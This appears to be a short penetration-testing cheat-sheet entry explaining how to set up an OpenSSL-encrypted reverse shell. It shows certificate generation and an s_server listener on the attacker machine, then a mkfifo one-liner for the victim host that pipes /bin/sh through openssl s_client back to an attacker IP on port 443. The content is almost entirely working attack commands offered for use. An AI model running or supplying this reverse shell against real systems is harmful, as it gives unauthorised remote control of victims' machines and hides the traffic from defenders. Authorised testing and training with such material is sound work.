# openSSL reverse shell

What we need to do first, is to generate an SSL certificate key pair for our listener on the attacker machine. We can do that with the following command:

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

This will create two files. A “key.pem” and “cert.pem” file. We’ll need those for our listener.

Next, we can start up our listener on the attacker machine using the openssl s\_server command while specifying our .pem files we created:

```
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
```

That will start up an openSSL listener with our certificate and associated key on port 443.

Now, on our target system, we create our mkfifo named pipe as a file called “x” in /tmp in conjunction with an openssl s\_client –quiet –connect command that will connect back to our attacker machine, and give us a shell on the victim host (over SSL):

```
mkfifo /tmp/x; /bin/sh -i < /tmp/x 2>&1 | openssl s_client -quiet -connect <attacker_IP>:443 >/tmp/x; rm /tmp/x
```
